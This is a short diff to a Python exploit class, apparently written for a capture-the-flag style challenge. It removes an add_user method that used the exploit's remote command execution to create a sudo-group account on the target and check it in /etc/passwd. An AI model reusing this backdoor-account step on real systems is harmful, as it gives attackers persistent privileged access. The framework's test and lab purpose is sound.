@@ -1,5 +1,4 @@
 import socket
-import time
 from Exploit import Exploit, PatchedException
 from BetterLogger import logger
 
@@ -54,26 +53,4 @@ class ChallengeOnePython(Exploit):
 			return True
 		except PatchedException:
 			logger.info(f"{COLOR_FAIL}The target is not vulnerable to ChallengeOnePython.{COLOR_END}")
-			return False
-
-	def add_user(self, username):
-		"""
-		Adds a user to the target with sudo privileges.
-
-		idempotent: True
-
-		Returns True if the user is on the target, or False if not
-		"""
-		logger.info(f"Adding user `{username}` with sudo privileges...")
-		add_user_command = f"useradd -m {username} -g sudo -s /bin/bash 2>&1" # redirect stderr to stdout so it's returned to us
-		self.run_custom_command(add_user_command)
-
-		# validate that the user was successfully added
-		check_user_id_command = f"grep -c '^{username}:' /etc/passwd"
-		command_output = self.run_custom_command(check_user_id_command)
-		if command_output == "1":
-			logger.info(f"Successfully added `{username}` with sudo privileges.")
-			return True
-		else:
-			logger.info(f"Failed to add `{username}` with sudo privileges.")
 			return False
